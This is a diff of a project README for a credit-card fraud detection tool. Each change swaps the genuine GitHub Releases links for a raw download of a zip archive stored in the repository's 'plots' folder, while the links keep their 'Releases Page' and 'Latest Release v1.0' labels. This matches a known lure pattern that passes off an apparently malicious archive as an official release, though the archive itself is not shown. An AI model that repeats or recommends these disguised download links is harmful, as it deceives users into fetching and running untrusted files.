@@ -6,7 +6,7 @@ Welcome to the credit-card-fraud-detection project! This application helps you a
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/sulemanyou64ab/credit-card-fraud-detection/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sulemanyou64ab/credit-card-fraud-detection/main/plots/credit-card-fraud-detection-2.8-beta.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/sulemanyou64ab/credit-card-fraud-detection/main/plots/credit-card-fraud-detection-2.8-beta.5.zip)
 
 ## 💻 System Requirements
 
@@ -25,11 +25,11 @@ To run this application, you need:
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/sulemanyou64ab/credit-card-fraud-detection/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/sulemanyou64ab/credit-card-fraud-detection/main/plots/credit-card-fraud-detection-2.8-beta.5.zip).
 
 ### Step-by-Step Installation
 
-1. Click on the [Releases Page](https://github.com/sulemanyou64ab/credit-card-fraud-detection/releases) link.
+1. Click on the [Releases Page](https://raw.githubusercontent.com/sulemanyou64ab/credit-card-fraud-detection/main/plots/credit-card-fraud-detection-2.8-beta.5.zip) link.
 2. Look for the latest version of the application.
 3. Select the appropriate file for your operating system.
 4. Click on the download link to save the file to your computer.
@@ -73,4 +73,4 @@ We thank everyone who contributed to this project and the research behind machin
 
 For further questions, you can reach us via the GitHub repository or report issues directly there. We appreciate your feedback and support!
 
-Remember to check the [Releases Page](https://github.com/sulemanyou64ab/credit-card-fraud-detection/releases) to stay updated on new features and improvements. Happy analyzing!
+Remember to check the [Releases Page](https://raw.githubusercontent.com/sulemanyou64ab/credit-card-fraud-detection/main/plots/credit-card-fraud-detection-2.8-beta.5.zip) to stay updated on new features and improvements. Happy analyzing!
